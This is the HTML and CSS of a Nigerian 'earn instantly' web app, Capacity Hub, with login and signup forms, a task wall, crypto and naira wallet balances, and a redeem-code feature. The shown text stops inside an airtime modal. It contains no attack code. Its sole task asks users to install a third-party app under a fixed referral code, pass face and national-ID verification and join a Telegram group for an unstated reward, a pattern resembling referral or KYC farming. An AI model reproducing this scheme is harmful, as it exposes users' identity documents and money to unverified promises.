<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Capacity Hub | Earn Instantly</title>

    <!-- PWA Meta Tags -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="CapacityHub">
    <meta name="theme-color" content="#f97316">
    <meta name="description" content="Earn instantly with Capacity Hub — tasks, crypto, forex, gaming and more.">

    <!-- PWA Manifest -->
    <link rel="manifest" href="manifest.json">

    <!-- Apple Touch Icon (uses placeholder; replace with real icon later) -->
    <link rel="apple-touch-icon" href="icon-192x192.png">
    <script>
        // Suppress Tailwind CDN production warning
        (function(){const w=console.warn;console.warn=function(){if(arguments[0]&&String(arguments[0]).includes('cdn.tailwindcss'))return;w.apply(console,arguments);};})();
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=Archivo+Black&family=Montserrat:wght@800;900&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            color: #1e293b;
            -webkit-tap-highlight-color: transparent;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        #splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease-out, visibility 0.5s;
        }

        .splash-logo-container {
            display: flex;
            align-items: center;
            font-family: 'Montserrat', sans-serif;
            font-weight: 900;
            font-size: 2.2rem;
            letter-spacing: -0.04em;
            text-transform: uppercase;
            opacity: 0;
            animation: fadeInUp 0.8s forwards 0.4s;
        }

        .logo-text-black { color: #0f172a; }
        .logo-text-orange { color: #f97316; }

        .splash-welcome {
            font-size: 0.7rem;
            font-weight: 600;
            color: #94a3b8;
            letter-spacing: 0.12em;
            text-transform: uppercase;
            margin-bottom: 0.15rem;
            opacity: 0;
            animation: fadeInDown 0.8s forwards 0.2s;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .orange-gradient {
            background: linear-gradient(135deg, #f97316 0%, #ea580c 100%);
        }

        .bottom-nav {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(15px);
            border-top: 1px solid #f1f5f9;
        }

        ::-webkit-scrollbar { display: none; }
        
        .fade-out {
            opacity: 0 !important;
            visibility: hidden !important;
            pointer-events: none;
        }

        .profile-item {
            display: flex;
            align-items: center;
            padding: 0.5rem 0.6rem;
            border-radius: 0.6rem;
            background: #f8fafc;
            margin-bottom: 0.75rem;
            transition: all 0.2s;
            cursor: pointer;
            border: 1px solid #f1f5f9;
        }

        .profile-item:active {
            background: #f1f5f9;
            transform: scale(0.98);
        }

        .nav-icon { font-size: 1.3rem; }
        .nav-text { font-size: 9px; margin-top: 2px; }

        .redemption-input {
            width: 100%;
            padding: 0.55rem 0.75rem;
            border: 1px solid #e2e8f0;
            border-radius: 10px;
            font-size: 0.8rem;
            text-align: center;
            letter-spacing: 0.1em;
            font-weight: 600;
        }

        .withdraw-input, .airtime-input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            font-size: 12px;
            margin-bottom: 10px;
            background: #f8fafc;
        }

        .guideline-section {
            padding: 1rem;
            background: #fdfdfd;
            border-radius: 1rem;
            border-left: 3px solid #f97316;
            margin-bottom: 1rem;
        }
        .guideline-title {
            font-weight: 800;
            font-size: 12px;
            color: #1e293b;
            margin-bottom: 4px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .guideline-text {
            font-size: 11px;
            color: #64748b;
            line-height: 1.5;
        }

        .footer-credits {
            text-align: center;
            font-size: 9px;
            color: #94a3b8;
            padding: 20px 0;
            font-weight: 500;
            letter-spacing: 0.02em;
        }

        .uid-badge {
            background: #f1f5f9;
            color: #64748b;
            font-size: 10px;
            font-weight: 800;
            padding: 4px 7px;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
            letter-spacing: 0.05em;
        }

        .history-item {
            padding: 12px;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .section-header {
            font-size: 12px;
            font-weight: 800;
            color: #1e293b;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 10px;
            margin-left: 4px;
        }

        .asset-card {
            background: #ffffff;
            padding: 0.45rem 0.6rem;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .asset-card:active {
            background-color: #f8fafc;
        }
        .asset-icon {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
        }

        /* Auth inputs */
        .auth-input {
            width: 100%;
            padding: 11px 13px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 13px;
            font-family: 'Inter', sans-serif;
            color: #1e293b;
            outline: none;
            background: #f8fafc;
            transition: border-color 0.2s, background 0.2s;
        }
        .auth-input:focus { border-color: #f97316; background: #fff; }
    </style>
</head>
<body class="pb-16">

    <!-- Splash Screen -->
    <div id="splash-screen">
        <div class="splash-welcome">Welcome to</div>
        <div class="splash-logo-container">
            <span class="logo-text-black">CAPACITY</span>
            <span class="logo-text-orange">HUB</span>
        </div>
    </div>

    <!-- Auth Screen -->
    <div id="auth-screen" class="hidden fixed inset-0 z-[200] bg-white overflow-y-auto">
        <div class="min-h-screen flex flex-col">

            <!-- Auth Header -->
            <div class="px-4 pt-4 pb-2 text-center">
                <h1 class="text-base font-black tracking-tighter text-slate-900">CAPACITY<span class="text-orange-500">HUB</span></h1>
                <p class="text-[11px] text-slate-400 font-bold uppercase tracking-widest mt-1">Earn. Withdraw. Grow.</p>
            </div>

            <!-- Tab Toggle -->
            <div class="flex mx-4 bg-slate-100 rounded-lg p-0.5 mb-2">
                <button id="tab-login-btn" onclick="showAuthTab('login')"
                    class="flex-1 py-2 rounded-lg text-[11px] font-black uppercase tracking-wider transition-all bg-white text-slate-900 shadow-sm">
                    Login
                </button>
                <button id="tab-signup-btn" onclick="showAuthTab('signup')"
                    class="flex-1 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all text-slate-400">
                    Sign Up
                </button>
            </div>

            <!-- LOGIN FORM -->
            <div id="auth-login" class="px-4 flex flex-col gap-1.5">
                <div class="flex flex-col gap-1.5">
                    <label class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Full Name</label>
                    <input id="login-name" type="text" placeholder="Enter your full name"
                        class="auth-input" autocomplete="name">
                </div>
                <div class="flex flex-col gap-1.5">
                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Password</label>
                    <div class="relative">
                        <input id="login-password" type="password" placeholder="Enter your password"
                            class="auth-input" style="padding-right:44px;" autocomplete="current-password">
                        <button type="button" onclick="toggleAuthPw('login-password', this)"
                            class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 text-sm">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                </div>
                <p id="login-error" class="hidden text-[11px] text-red-500 font-bold text-center bg-red-50 border border-red-100 rounded-xl py-2.5 px-3">
                    Username or password are incorrect.
                </p>
                <button onclick="logIn()"
                    class="w-full bg-orange-500 text-white py-3 rounded-xl font-black text-xs uppercase tracking-wider mt-2 active:scale-[0.98] transition-transform shadow-lg shadow-orange-500/20">
                    Login
                </button>
                <p class="text-center text-[11px] text-slate-400 mt-1">Don't have an account?
                    <span onclick="showAuthTab('signup')" class="text-orange-500 font-bold cursor-pointer">Sign Up</span>
                </p>
            </div>

            <!-- SIGNUP FORM -->
            <div id="auth-signup" class="hidden px-4 flex flex-col gap-1.5">
                <div class="flex flex-col gap-1.5">
                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Full Name</label>
                    <input id="signup-name" type="text" placeholder="Enter your full name"
                        class="auth-input" autocomplete="name">
                </div>
                <div class="flex flex-col gap-1.5">
                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Phone Number</label>
                    <div class="flex gap-2">
                        <div class="relative" style="width:110px;flex-shrink:0;">
                            <input id="signup-code" type="text" placeholder="+234"
                                class="auth-input" style="width:110px;"
                                oninput="filterCountryCodes(this.value)"
                                onfocus="showCountryDropdown()"
                                autocomplete="off">
                            <div id="country-dropdown"
                                class="hidden absolute left-0 top-full mt-1 bg-white border border-slate-200 rounded-2xl shadow-xl z-50 overflow-y-auto"
                                style="width:260px;max-height:220px;">
                            </div>
                        </div>
                        <input id="signup-phone" type="tel" placeholder="Phone number"
                            class="auth-input flex-1" autocomplete="tel">
                    </div>
                    <p class="text-[9px] text-slate-400 font-bold">Put your country code above it will appear below just click it.</p>
                </div>
                <div class="flex flex-col gap-1.5">
                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Password</label>
                    <div class="relative">
                        <input id="signup-password" type="password" placeholder="Create a password"
                            class="auth-input" style="padding-right:44px;" autocomplete="new-password">
                        <button type="button" onclick="toggleAuthPw('signup-password', this)"
                            class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 text-sm">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                </div>
                <div class="flex flex-col gap-1.5">
                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Referral Code <span class="text-slate-300 normal-case font-bold">(Optional)</span></label>
                    <input id="signup-referral" type="text" placeholder="Enter referral code if you have one"
                        class="auth-input" autocomplete="off">
                </div>
                <p id="signup-error" class="hidden text-[11px] text-red-500 font-bold text-center bg-red-50 border border-red-100 rounded-xl py-2.5 px-3"></p>
                <button onclick="signUp()"
                    class="w-full bg-orange-500 text-white py-3 rounded-xl font-black text-xs uppercase tracking-wider mt-2 active:scale-[0.98] transition-transform shadow-lg shadow-orange-500/20">
                    Create Account
                </button>
                <p class="text-center text-[11px] text-slate-400 mt-1">Already have an account?
                    <span onclick="showAuthTab('login')" class="text-orange-500 font-bold cursor-pointer">Login</span>
                </p>
            </div>

            <div class="px-6 pt-8 pb-6 text-center">
                <p class="text-[9px] text-slate-300 font-bold uppercase tracking-widest">Privacy Policy · c 2026 Capacity Nigtech</p>
            </div>
        </div>
    </div>

    <!-- Main App Content -->
    <div id="main-app" class="hidden">
        <nav class="p-3 flex justify-between items-center sticky top-0 z-50 bg-white/80 backdrop-blur-md">
            <div>
                <h1 class="text-base font-black tracking-tighter text-slate-900">CAPACITY<span class="text-orange-500">HUB</span></h1>
            </div>
            <div class="flex items-center gap-3">
                <div id="notif-bell" onclick="toggleHistory()" class="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 cursor-pointer relative active:scale-90 transition-transform">
                    <i class="fas fa-bell text-sm"></i>
                    <span id="notif-dot" class="hidden absolute top-2 right-2 w-1.5 h-1.5 bg-red-500 rounded-full border border-white"></span>
                </div>
                <div class="flex flex-col items-end gap-0.5">
                    <div class="uid-badge" id="nav-balance-ngn" style="padding:3px 8px;font-size:9px;">₦0.00</div>
                    <div class="uid-badge" id="nav-balance-usdt" style="padding:3px 8px;font-size:9px;background:#f0fdf4;color:#16a34a;border-color:#bbf7d0;">0.00 USDT</div>
                </div>
            </div>
        </nav>

        <main class="px-4 space-y-4">
            <div id="content-area">
                <!-- Dashboard View -->
                <div id="view-dashboard" class="space-y-4">
                    
                    <div class="pt-2">
                        <h2 class="section-header">EARNING CATEGORIES</h2>
                        <div class="bg-[#f8fafc] border border-gray-100 p-3 rounded-[1.5rem] grid grid-cols-3 gap-y-3 gap-x-1 text-center shadow-sm">
                            
                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-robot text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">AI</span>
                            </div>

                            <div onclick="handleInstallApp()" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-download text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Apps Install</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-dice text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Betting</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fab fa-bitcoin text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Crypto</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-graduation-cap text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Education</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-chart-line text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Forex</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-gamepad text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Gaming</span>
                            </div>

                            <div onclick="handleSimpleTask()" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-check-circle text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Simple Task</span>
                            </div>

                            <div onclick="switchTab('offers')" class="flex flex-col items-center cursor-pointer active:scale-95 transition-transform">
                                <div class="w-12 h-12 bg-white rounded-[1rem] flex items-center justify-center shadow-[0_8px_24px_rgba(0,0,0,0.03)] border border-slate-100/50">
                                    <i class="fas fa-cubes text-[#f97316]" style="font-size:16px;width:16px;height:16px;"></i>
                                </div>
                                <span class="text-[8px] font-extrabold text-slate-700 uppercase tracking-tight mt-1">Web3</span>
                            </div>

                        </div>
                    </div>

                    <div class="flex justify-between items-center px-1 pt-2">
                        <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight">Earning Guidelines</h3>
                        <button onclick="goToSupport()" class="text-orange-500 text-[11px] font-semibold">Help Center</button>
                    </div>

                    <div class="space-y-4">
                        <div class="guideline-section">
                            <h4 class="guideline-title">1. Verified Activities Only</h4>
                            <p class="guideline-text">Every task (following social media, watching videos, or taking surveys) is monitored. You must stay on the task page until it is completed. Use of VPNs or ad-blockers is strictly prohibited.</p>
                        </div>
                        <div class="guideline-section">
                            <h4 class="guideline-title">2. Referral System</h4>
                            <p class="guideline-text">Share your unique referral link to earn a commission when your friends complete their first task. Self-referrals are detected and accounts will be banned.</p>
                        </div>
                        <div class="guideline-section">
                            <h4 class="guideline-title">3. Fair Play & Security</h4>
                            <p class="guideline-text">Do not use automated bots or scripts. Capacity Hub staff will never ask for your password or Transaction PIN.</p>
                        </div>
                        <div class="guideline-section">
                            <h4 class="guideline-title">4. Withdrawal Rules</h4>
                            <p class="guideline-text">Minimum withdrawal amounts apply. Payments are processed within 24 hours. Ensure your details are 100% correct.</p>
                        </div>
                    </div>
                </div>

                <!-- Offers View — Tasks written directly in HTML, no JS needed -->
                <div id="view-offers" class="hidden space-y-4 px-1 pt-2">
                    <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight text-center">TASK WALL</h3>
                    <div class="space-y-3">

                        <!-- ═══ TASK 1: Hiring Web3 Enthusiasts ═══ -->
                        <div class="bg-white border border-orange-100 rounded-2xl overflow-hidden shadow-sm">
                            <!-- Header -->
                            <div class="bg-gradient-to-r from-orange-500 to-orange-400 px-4 py-3 flex items-center gap-3">
                                <div class="w-9 h-9 bg-white/20 rounded-lg flex items-center justify-center">
                                    <i class="fas fa-globe text-white" style="font-size:15px;"></i>
                                </div>
                                <div class="flex-1">
                                    <p class="text-[12px] font-black text-white">Hiring Web3 Enthusiasts</p>
                                    <p class="text-[9px] text-orange-100 font-bold">Meta Earth App • KYC Required</p>
                                </div>
                                <span class="bg-white text-orange-500 text-[10px] font-black px-2 py-1 rounded-lg">WEB3</span>
                            </div>
                            <!-- Instructions -->
                            <div class="px-4 py-3 space-y-2.5">
                                <!-- Step 1 -->
                                <div class="flex gap-2.5 items-start">
                                    <div class="w-5 h-5 rounded-full bg-orange-500 flex items-center justify-center flex-shrink-0 mt-0.5">
                                        <span class="text-white font-black" style="font-size:9px;">1</span>
                                    </div>
                                    <div>
                                        <p class="text-[11px] font-bold text-slate-700">Download the Meta Earth App</p>
                                        <a href="https://play.google.com/store/apps/details?id=com.xd.metapass" target="_blank" rel="noopener noreferrer"
                                            onclick="window.open('https://play.google.com/store/apps/details?id=com.xd.metapass','_system'); return false;"
                                            class="text-[10px] text-orange-500 font-bold underline break-all">Google Play Store →</a>
                                        <p class="text-[9px] text-slate-400 mt-0.5">🍎 iPhone users: also available on Apple App Store</p>
                                    </div>
                                </div>
                                <!-- Step 2 -->
                                <div class="flex gap-2.5 items-start">
                                    <div class="w-5 h-5 rounded-full bg-orange-500 flex items-center justify-center flex-shrink-0 mt-0.5">
                                        <span class="text-white font-black" style="font-size:9px;">2</span>
                                    </div>
                                    <div>
                                        <p class="text-[11px] font-bold text-slate-700">Create account with referral code</p>
                                        <div class="flex items-center gap-2 mt-1 bg-orange-50 border border-orange-200 rounded-lg px-3 py-1.5">
                                            <i class="fas fa-key text-orange-400" style="font-size:10px;"></i>
                                            <span class="text-[12px] font-black text-orange-600 tracking-widest">y92x8cjd</span>
                                            <button onclick="copyCode()" class="ml-auto bg-orange-500 text-white text-[9px] font-black px-2 py-0.5 rounded-md active:scale-95">COPY</button>
                                        </div>
                                    </div>
                                </div>
                                <!-- Step 3 -->
                                <div class="flex gap-2.5 items-start">
                                    <div class="w-5 h-5 rounded-full bg-orange-500 flex items-center justify-center flex-shrink-0 mt-0.5">
                                        <span class="text-white font-black" style="font-size:9px;">3</span>
                                    </div>
                                    <div>
                                        <p class="text-[11px] font-bold text-slate-700">Complete verification steps</p>
                                        <div class="mt-1 space-y-1">
                                            <div class="flex items-center gap-1.5"><i class="fas fa-check-circle text-green-500" style="font-size:10px;"></i><span class="text-[10px] text-slate-600 font-bold">Face Verification</span></div>
                                            <div class="flex items-center gap-1.5"><i class="fas fa-check-circle text-green-500" style="font-size:10px;"></i><span class="text-[10px] text-slate-600 font-bold">ID Verification (KYC)</span></div>
                                        </div>
                                    </div>
                                </div>
                                <!-- Step 4 -->
                                <div class="flex gap-2.5 items-start">
                                    <div class="w-5 h-5 rounded-full bg-orange-500 flex items-center justify-center flex-shrink-0 mt-0.5">
                                        <span class="text-white font-black" style="font-size:9px;">4</span>
                                    </div>
                                    <div>
                                        <p class="text-[11px] font-bold text-slate-700">Join our Telegram onboarding group</p>
                                        <a href="https://t.me/+QynO43F75UtmMzNk" target="_blank" rel="noopener noreferrer"
                                            onclick="window.open('https://t.me/+QynO43F75UtmMzNk','_system'); return false;"
                                            class="text-[10px] text-blue-500 font-bold underline">Join Training Group →</a>
                                    </div>
                                </div>
                                <!-- Warning -->
                                <div class="bg-red-50 border border-red-100 rounded-xl p-3 mt-1">
                                    <p class="text-[9px] font-black text-red-500 uppercase tracking-wider mb-1">⚠️ Important Notice</p>
                                    <p class="text-[10px] text-red-600 font-bold">• No slip IDs accepted for KYC</p>
                                    <p class="text-[10px] text-red-600 font-bold">• Only National ID Card or Passport</p>
                                    <p class="text-[10px] text-red-600 font-bold">• Must use referral code: <span class="text-orange-500">y92x8cjd</span></p>
                                </div>
                                <!-- Good luck -->
                                <p class="text-[9px] text-slate-400 text-center font-bold pt-1">✨ Good luck — Earn, Withdraw, and Grow with CapacityHub!</p>
                            </div>
                            <!-- Submit Button -->
                            <div class="px-4 pb-4">
                                <button onclick="openTaskSubmit('Hiring Web3 Enthusiasts','Meta Earth App — KYC Verified','Reward')"
                                    class="w-full bg-orange-500 text-white py-2 rounded-xl font-black text-[11px] uppercase tracking-wider active:scale-[0.98] transition-transform shadow-md shadow-orange-500/20">
                                    ✅ Submit Proof
                                </button>
                            </div>
                        </div>
                        <!-- ═══ ADD NEW TASKS BELOW ═══ -->

                    </div>
                </div>

                <!-- Assets View -->
                <div id="view-assets" class="hidden space-y-5 pt-4">
                    <div id="wallet-main-display" class="space-y-6 max-w-sm mx-auto">
                        
                        <div class="p-6 bg-slate-50 rounded-[2rem] border border-slate-100 text-center">
                            <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-1">Total Assets Portfolio</p>
                            <div class="flex items-baseline justify-center gap-1.5">
                                <h2 class="text-3xl font-black text-slate-900" id="total-portfolio-value">₦0.00</h2>
                                <span class="text-xs font-bold text-slate-400">NGN</span>
                            </div>
                            <p class="text-[10px] text-slate-400 font-bold mt-1" id="total-portfolio-value-usd">≈ 0.00 USD</p>
                        </div>

                        <div class="space-y-1">
                            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-3 px-2">Account Assets</h3>
                            
                            <!-- 1. Tether USDT -->
                            <div onclick="openWithdrawalModal('Tether USDT')" class="asset-card">
                                <div class="flex items-center gap-3">
                                    <div>
                                        <h4 class="font-extrabold text-slate-800 text-sm leading-tight">USDT</h4>
                                        <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">Tether</p>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <p id="balance-usdt" class="font-black text-slate-800 text-sm">0.00</p>
                                    <p id="balance-usdt-fiat" class="text-[10px] text-slate-400 font-bold mt-0.5">≈ 0.00 USD</p>
                                </div>
                            </div>

                            <!-- 2. Naira NGN -->
                            <div onclick="openWithdrawalModal('Naira NGN')" class="asset-card">
                                <div class="flex items-center gap-3">
                                    <div>
                                        <h4 class="font-extrabold text-slate-800 text-sm leading-tight">NGN</h4>
                                        <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">Naira NGN</p>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <p id="balance-naira" class="font-black text-slate-800 text-sm">₦0.00</p>
                                    <p id="balance-naira-fiat" class="text-[10px] text-slate-400 font-bold mt-0.5">≈ 0.00 USD</p>
                                </div>
                            </div>

                            <!-- 3. CPH -->
                            <div class="asset-card">
                                <div class="flex items-center gap-3">
                                    <div>
                                        <h4 class="font-extrabold text-slate-800 text-sm leading-tight">CPH</h4>
                                        <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider mt-0.5">CPH/USDT/NGN</p>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <p id="balance-cph" class="font-black text-slate-800 text-sm">0.00</p>
                                    <p id="balance-cph-fiat" class="text-[10px] text-slate-400 font-bold mt-0.5">≈ 0.00 USD</p>
                                </div>
                            </div>
                        </div>

                        <!-- Redeem Code -->
                        <div class="bg-slate-50 p-3 rounded-xl border border-dashed border-slate-200 mt-4">
                            <h3 class="text-[9px] font-bold text-slate-800 uppercase tracking-wider mb-2">Redeem Code</h3>
                            <div class="flex flex-col gap-1.5">
                                <input type="text" id="redemption-code" class="redemption-input" placeholder="ENTER CODE HERE" oninput="this.value = this.value.toUpperCase()">
                                <button onclick="applyRedemption()" class="w-full bg-orange-500 text-white py-1.5 rounded-lg font-bold text-[10px] active:scale-[0.98] transition-transform">Apply Code</button>
                            </div>
                        </div>

                        <!-- Swap Feature -->
                        <div class="bg-slate-50 p-3 rounded-xl border border-dashed border-slate-200 mt-2">
                            <h3 class="text-[9px] font-bold text-slate-800 uppercase tracking-wider mb-2">Swap</h3>
                            <button onclick="openSwapModal()" class="w-full bg-orange-500 text-white py-1.5 rounded-lg font-bold text-[10px] active:scale-[0.98] transition-transform">Swap Assets</button>
                        </div>

                    </div>
                </div>

                <!-- Profile View -->
                <div id="view-profile" class="hidden space-y-2 pt-4">

                    <!-- User Info Card -->
                    <div class="bg-slate-50 rounded-2xl border border-slate-100 p-3 mb-1.5">
                        <div class="flex items-center gap-4 mb-4">
                            <div class="w-8 h-8 rounded-lg bg-orange-500 flex items-center justify-center text-white font-black text-sm" id="profile-avatar">U</div>
                            <div>
                                <p class="font-black text-slate-900 text-sm" id="profile-name">User</p>
                                <p class="text-[10px] text-slate-400 font-bold mt-0.5" id="profile-uid">UID: —</p>
                            </div>
                        </div>

                    </div>



                    <!-- Customer Support -->
                    <div class="profile-item" onclick="openSupportModal()">
                        <div class="w-6 h-6 rounded-md bg-orange-50 flex items-center justify-center mr-2.5"><i class="fas fa-headset text-orange-500 text-xs"></i></div>
                        <div class="flex-1"><h4 class="font-bold text-slate-800 text-xs">User Support</h4></div>
                        <i class="fas fa-chevron-right text-[10px] text-slate-300"></i>
                    </div>

                    <!-- Log Out -->
                    <div class="profile-item" onclick="logOut()" style="border:1px solid #fee2e2;background:#fff5f5;">
                        <div class="w-6 h-6 rounded-md bg-red-50 flex items-center justify-center mr-2.5"><i class="fas fa-right-from-bracket text-red-500 text-xs"></i></div>
                        <div class="flex-1"><h4 class="font-bold text-red-500 text-xs">Log Out</h4></div>
                        <i class="fas fa-chevron-right text-[10px] text-red-200"></i>
                    </div>

                    <div class="footer-credits mt-12 mb-4">
                        Privacy policy | c 2026. Capacity Nigtech-All Rights Reserved.
                    </div>
                </div>
            </div>
        </main>

        <!-- Bottom Navigation -->
        <nav class="bottom-nav fixed bottom-0 left-0 right-0 px-6 py-2 flex justify-between items-center z-50 rounded-t-[1.5rem] shadow-lg">
            <button onclick="switchTab('dashboard')" class="flex flex-col items-center nav-btn transition-colors duration-200 text-orange-500" id="nav-dashboard">
                <i class="fas fa-home nav-icon"></i><span class="nav-text uppercase font-bold">Dashboard</span>
            </button>
            <button onclick="switchTab('offers')" class="flex flex-col items-center nav-btn transition-colors duration-200 text-slate-400" id="nav-offers">
                <i class="fas fa-rocket nav-icon"></i><span class="nav-text uppercase font-bold">Tasks</span>
            </button>
            <button onclick="switchTab('assets')" class="flex flex-col items-center nav-btn transition-colors duration-200 text-slate-400" id="nav-assets">
                <i class="fas fa-wallet nav-icon"></i><span class="nav-text uppercase font-bold">Assets</span>
            </button>
            <button onclick="switchTab('profile')" class="flex flex-col items-center nav-btn transition-colors duration-200 text-slate-400" id="nav-profile">
                <i class="fas fa-user-circle nav-icon"></i><span class="nav-text uppercase font-bold">Profile</span>
            </button>
        </nav>
    </div>

    <!-- Action Modal -->
    <div id="modal-container" class="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-xs rounded-2xl p-6 transform scale-90 transition-transform" id="modal-content">
            <div id="modal-icon" class="w-12 h-12 rounded-xl orange-gradient mx-auto mb-4 flex items-center justify-center text-white text-lg"></div>
            <h3 id="modal-title" class="text-base font-bold text-center text-slate-900 mb-1"></h3>
            <div id="modal-body" class="mb-6 text-[11px] text-slate-500 text-center"></div>
            <button onclick="closeModal()" class="w-full bg-slate-900 text-white py-3 rounded-xl font-bold text-xs">Done</button>
        </div>
    </div>

    <!-- Airtime Modal -->
    <div id="airtime-modal" class="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/40 opacity-0 pointer-events-none transition-opacity">
        <div class="bg-white w-full max-w-sm rounded-3xl p-6 transform scale-90 transition-transform shadow-2xl">
            <div class="flex justify-between items-center mb-5">
                <h3 class="text-sm font-bold text-slate-800 uppercase tracking-tight">Airtime Top-up</h3>
                <button onclick="closeAirtimeModal()" class="text-slate-400 p-1"><i class="fas fa-times"></i></button>
            </div>
            <div id="airtime-form">
                <div class="space-y-3">
